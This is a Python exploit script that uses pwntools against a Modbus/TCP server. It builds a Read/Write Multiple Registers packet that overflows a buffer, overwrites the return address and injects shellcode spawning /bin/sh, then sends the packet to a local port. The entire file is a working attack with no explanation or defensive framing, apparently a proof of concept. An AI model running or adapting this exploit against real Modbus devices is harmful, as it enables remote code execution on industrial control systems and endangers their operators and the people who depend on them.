import socket
from pwn import *

# shellcode to execute /bin/sh
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

# some context-related addresses in the server's memory (hardcoded here)
ctx = 0x804c1a0
req = 0x804c1f0
req_length = 0x104
mb_mapping = 0x804c300

# address to overwrite the return address with
ret = p32(0xffffd070)       

# build the malicious Modbus/TCP packet
def build_modbus_packet():
    # Transaction header fields
    transaction_id = b'\x00\x01'           # Transaction Identifier
    protocol_id = b'\x00\x00'              # Protocol Identifier (always 0 for Modbus)
    length = b'\x00\x0F'                   # Length of remaining bytes
    unit_id = b'\xFF'                      # Unit Identifier
    function_code = b'\x17'               # Function code: 23 (Read/Write Multiple Registers)

    # PDU (Protocol Data Unit)
    read_reference_number = b'\x00\x00'   # Read starting address
    read_word_count = b'\x01\xff'         # Number of words to read
    write_reference_number = b'\x00\x91' # Write starting address
    write_word_count = b'\x0f\xff'       # Number of words to write
    byte_count = b'\xF3'                  # Number of bytes to write

    data = b'\x00\xcf\x00'                # Custom payload
    data += b'\x00'*2                    # Padding
    data += b'\x00'*0x14                 # More padding
    data += b'\x9f\x00'                  # Custom value
    data += b'\x00'*22                   # More padding
    data += b'\x5d\x01'                  # Custom response length
    data += b'\x00'*6                    # More padding
    data += b'\x11'*4                    # Overwrite saved EBP
    data += ret                          # Overwrite return address
    data += p32(ctx)                     # Context pointer
    data += p32(req)                     # Request pointer
    data += p32(req_length)             # Request length
    data += p32(mb_mapping)             # Modbus mapping pointer
    data += shellcode                   # Injected shellcode
    data += b'\x55'*0x100               # Fill remaining buffer with padding

    # Construct full Modbus/TCP packet
    pdu = read_reference_number + read_word_count + write_reference_number + write_word_count + byte_count + data
    packet = transaction_id + protocol_id + length + unit_id + function_code + pdu
    return packet


# send the crafted Modbus/TCP packet to the target server
def send_modbus_packet():
    server_address = ('127.0.0.1', 1502)  # target IP and port
    modbus_packet = build_modbus_packet()

    # establish TCP connection
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect(server_address)
        print(f'Sending: {modbus_packet.hex()}')
        client_socket.sendall(modbus_packet)

        # receive server response (if any)
        response = client_socket.recv(1024)
        print(f'Received: {response.hex()}')


# execute the attack
send_modbus_packet()
